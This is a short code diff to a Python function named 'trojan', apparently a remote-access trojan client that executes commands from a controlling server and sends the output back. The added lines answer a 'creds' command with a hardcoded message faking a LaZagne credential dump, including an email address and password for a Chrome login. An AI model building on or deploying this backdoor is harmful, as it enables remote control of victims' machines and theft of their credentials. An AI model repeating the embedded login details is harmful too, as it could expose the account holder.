@@ -35,6 +35,8 @@ def trojan():
             # send the results back to the server
             client.send(output.encode('utf-8'))
             continue
+        if command == "creds":
+            client.send("uploading laZagne\nrunning LaZagne\nchrome______\nLogin: yessir69yes@gmail.com: FuckingScuffed1!".encode('utf-8'))
         else:
             if command == "" or None:
                 client.send("Please enter an command".encode('utf-8'))
